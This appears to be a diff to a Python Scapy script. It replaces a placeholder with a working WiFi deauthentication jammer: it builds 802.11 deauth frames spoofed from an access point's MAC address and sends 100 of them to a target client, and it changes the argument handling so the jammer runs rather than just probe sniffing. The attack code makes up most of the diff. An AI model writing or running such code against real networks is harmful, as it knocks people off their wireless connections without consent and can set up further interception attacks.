@@ -103,10 +103,12 @@ def argumentTreat(args):
             print "Exiting..."
             exit(0)
 
+        # Error checking done - let's freakin' jam shit
+        jam(iface, target, accesspoint)
 
-    # Regardless of previous options, we want to sniff
-    # TODO - make an option for jamming
-    probeSniff(iface)
+    else:
+        # Just sniff shit
+        probeSniff(iface)
 
 
 # Basically just a start-up menu
@@ -120,7 +122,10 @@ def printVerboseDetails():
 # The jammer part
 # Takes in the interface, targetMac and apMac
 def jam(iface, targetMac, apMac):
-    print "Jam"
+    # Create a packet that goes to the target from the ap
+    jamPacketClient = Dot11(addr1 = targetMac,
+        addr2 = apMac, addr3 = apMac)/Dot11Deauth()
+    send(jamPacketClient, count=100) # send 100 packets
 
 
 
